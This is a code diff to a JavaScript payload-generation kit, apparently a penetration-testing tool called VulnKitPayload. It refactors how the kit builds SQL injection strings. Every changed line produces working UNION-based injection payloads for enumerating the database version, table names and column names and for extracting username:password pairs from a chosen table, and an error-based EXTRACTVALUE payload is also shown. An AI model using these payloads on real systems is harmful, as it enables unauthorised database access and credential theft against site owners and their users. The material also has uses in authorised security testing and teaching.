@@ -58,6 +58,12 @@ window.VulnKitPayload = (function () {
     ],
   };
 
+  function sqliCols(expr, slot, n) {
+    var cols = [];
+    for (var i = 0; i < n; i++) cols.push(i === slot ? expr : 'NULL');
+    return cols.join(',');
+  }
+
   function buildSqliPayloads(n, table) {
     const nulls = Array(n).fill('NULL').join(',');
     return {
@@ -68,20 +74,20 @@ window.VulnKitPayload = (function () {
         `' UNION SELECT ${nulls}--+`,
       ],
       版本枚举: [
-        `' UNION SELECT NULL,version(),NULL--+`.replace('NULL,NULL,NULL', nulls),
-        `' UNION SELECT NULL,@@version,NULL--+`.replace('NULL,NULL,NULL', nulls),
-        `' UNION SELECT NULL,@@GLOBAL.VERSION,NULL--+`.replace('NULL,NULL,NULL', nulls),
+        `' UNION SELECT ${sqliCols('version()', 1, n)}--+`,
+        `' UNION SELECT ${sqliCols('@@version', 1, n)}--+`,
+        `' UNION SELECT ${sqliCols('@@GLOBAL.VERSION', 1, n)}--+`,
       ],
       表名枚举: [
-        `' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--+`,
-        `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--+`,
+        `' UNION SELECT ${sqliCols('GROUP_CONCAT(table_name)', 1, n)} FROM information_schema.tables WHERE table_schema=database()--+`,
+        `' UNION SELECT ${sqliCols('table_name', 1, n)} FROM information_schema.tables--+`,
       ],
       列名枚举: [
-        `' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='${table}'--+`,
+        `' UNION SELECT ${sqliCols('GROUP_CONCAT(column_name)', 1, n)} FROM information_schema.columns WHERE table_name='${table}'--+`,
       ],
       数据提取: [
-        `' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password),NULL FROM ${table}--+`,
-        `' UNION SELECT NULL,username||':'||password,NULL FROM ${table}--+`,
+        `' UNION SELECT ${sqliCols('GROUP_CONCAT(username,0x3a,password)', 1, n)} FROM ${table}--+`,
+        `' UNION SELECT ${sqliCols("username||':'||password", 1, n)} FROM ${table}--+`,
       ],
       报错注入: [
         "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--+",
